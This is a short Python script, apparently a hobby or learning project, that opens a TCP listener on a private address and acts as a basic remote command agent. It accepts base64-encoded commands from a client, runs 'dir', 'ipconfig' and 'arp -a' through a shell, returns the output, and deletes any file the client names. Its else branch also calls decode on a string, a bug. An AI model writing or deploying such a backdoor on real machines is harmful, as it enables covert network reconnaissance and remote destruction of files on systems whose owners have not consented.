import socket
import subprocess
import time
import base64
import os

def to_1024(data):
    chunk_size = 1024
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    return chunks

def encode64(data):
    return base64.b64encode(data)

def decode64(data):
    return base64.b64decode(data)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server = ('192.168.50.200',22222)
sock.bind(server)

sock.listen(1)
print("Listening for connections...")

connection, client_address = sock.accept()
print(f"Connection from {client_address}")

data = decode64(connection.recv(1024))
print(f"Received: {data.decode()}")

connection.sendall(encode64(b'Hello, client'))


while 1:
    data = decode64(connection.recv(1024)).decode()
    if data=="close":
        print("Connection closed by server")
        break
    elif data=="dir":
        print(f"Received: {data}")
        result = encode64(subprocess.run("dir", shell=True, text=True, capture_output=True).stdout.encode())
        chunks = to_1024(result)
        connection.send(encode64(str(len(chunks)).encode()))
        time.sleep(1)
        for chunk in chunks:
            connection.sendall(chunk)
    elif data=="ipconfig":
        print(f"Received: {data}")
        result = encode64(subprocess.run("ipconfig", shell=True, text=True, capture_output=True).stdout.encode())
        chunks = to_1024(result)
        connection.send(encode64(str(len(chunks)).encode()))
        time.sleep(1)
        for chunk in chunks:
            connection.sendall(chunk)
    elif data=="arp -a":
        print(f"Received: {data}")
        result = encode64(subprocess.run("arp -a", shell=True, text=True, capture_output=True).stdout.encode())
        chunks = to_1024(result)
        connection.send(encode64(str(len(chunks)).encode()))
        time.sleep(1)
        for chunk in chunks:
            connection.sendall(chunk)
    elif "del" in data:
        file_name = data.split(" ")[1]
        path = os.path.abspath(os.getcwd())
        try:
            os.remove(f"{path}\\{file_name}")
            connection.send(encode64(b'Done'))
        except:
            connection.send(encode64(b'Wrong file name'))
            
    else:
        print(f"Received: {data.decode()}")
connection.close()